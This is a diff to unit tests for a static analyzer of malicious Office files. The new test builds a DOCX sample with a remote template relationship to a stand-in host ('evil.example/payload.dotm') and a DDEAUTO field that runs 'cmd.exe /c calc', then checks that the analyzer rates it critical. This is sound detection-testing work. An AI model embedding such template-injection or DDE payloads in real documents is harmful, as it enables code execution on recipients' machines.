@@ -26,10 +26,11 @@ def build_ooxml(path: Path, files: dict[str, str | bytes]) -> None:
             "[Content_Types].xml",
             '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>',
         )
-        archive.writestr(
-            "word/document.xml",
-            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
-        )
+        if "word/document.xml" not in files:
+            archive.writestr(
+                "word/document.xml",
+                '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"/>',
+            )
         for name, data in files.items():
             archive.writestr(name, data)
 
@@ -91,6 +92,38 @@ class StaticAnalyzerTests(unittest.TestCase):
         self.assertIn("Macro Auto-Execution Trigger", titles)
         self.assertIn("Macro Process Execution", titles)
         self.assertIn("Remote Document Relationships", titles)
+
+    def test_malicious_docx_without_macro_project_is_flagged(self) -> None:
+        with tempfile.TemporaryDirectory() as temp_dir:
+            sample = Path(temp_dir) / "template_injection.docx"
+            build_ooxml(
+                sample,
+                {
+                    "word/_rels/settings.xml.rels": (
+                        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+                        '<Relationship Id="rIdTpl" '
+                        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+                        'Target="https://evil.example/payload.dotm" TargetMode="External"/>'
+                        "</Relationships>"
+                    ),
+                    "word/document.xml": (
+                        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
+                        "<w:body><w:p><w:r><w:instrText>DDEAUTO cmd.exe /c calc</w:instrText></w:r></w:p></w:body>"
+                        "</w:document>"
+                    ),
+                },
+            )
+            result = AnalyzerEngine(skip_yara=True).analyze_file(sample)
+
+        titles = {finding.title for finding in result.findings}
+        self.assertIn("High-Risk External OOXML Relationship", titles)
+        self.assertIn("OOXML DDE Field", titles)
+        self.assertIn("Suspicious Command Text In OOXML", titles)
+        self.assertGreaterEqual(result.risk_score, 75)
+        self.assertEqual(result.risk_level, "critical")
+        components = result.score_breakdown["components"]
+        self.assertTrue(any(component["key"] == "relationship" for component in components))
+        self.assertTrue(any(component["key"] == "macro" for component in components))
 
     def test_ooxml_embedded_script_is_flagged(self) -> None:
         with tempfile.TemporaryDirectory() as temp_dir:
